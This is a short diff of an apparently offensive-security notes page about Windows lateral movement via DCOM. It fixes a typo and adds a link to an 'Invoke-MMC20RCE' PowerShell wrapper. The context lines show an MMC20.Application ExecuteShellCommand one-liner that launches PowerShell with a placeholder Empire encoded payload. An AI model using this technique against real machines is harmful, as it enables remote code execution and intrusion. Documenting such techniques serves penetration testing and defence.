@@ -1151,7 +1151,7 @@ meterpreter &gt;
 </div>
 <div class="section" id="dcom">
 <h3>DCOM<a class="headerlink" href="#dcom" title="Permalink to this headline">¶</a></h3>
-<p>The below is as per my understanding (I might be wrong), if so, please do correct me. After reading <a class="reference external" href="https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/">Lateral Movement Using the MMC20.Application COM Object</a> and <a class="reference external" href="https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/">Lateral Movement Via DCOM Round 2</a> I believer there are three ways to do lateral movement by using DCOM</p>
+<p>The below is as per my understanding (I might be wrong), if so, please do correct me. After reading <a class="reference external" href="https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/">Lateral Movement Using the MMC20.Application COM Object</a> and <a class="reference external" href="https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/">Lateral Movement Via DCOM Round 2</a> I believe there are three ways to do lateral movement by using DCOM</p>
 <ul class="simple">
 <li>DCOM applications via MMC Application Class (MMC20.Application) : This COM object allows you to script components of MMC snap-in operations. there is a method named “ExecuteShellCommand” under Document.ActiveView.</li>
 </ul>
@@ -1163,6 +1163,7 @@ For Empire:
 $com.Document.ActiveView.ExecuteShellCommand(&quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&quot;,$null,&quot;-enc DFDFSFSFSFSFSFSFSDFSFSF &lt; Empire encoded string &gt; &quot;,&quot;7&quot;)
 </pre></div>
 </div>
+<p>Tanoy has written a simple wrapper/ function <cite>Invoke-MMC20RCE.ps1 &lt;https://raw.githubusercontent.com/n0tty/powershellery/master/Invoke-MMC20RCE.ps1</cite> which might be useful.</p>
 </div></blockquote>
 <ul class="simple">
 <li>DCOM via ShellExecute</li>
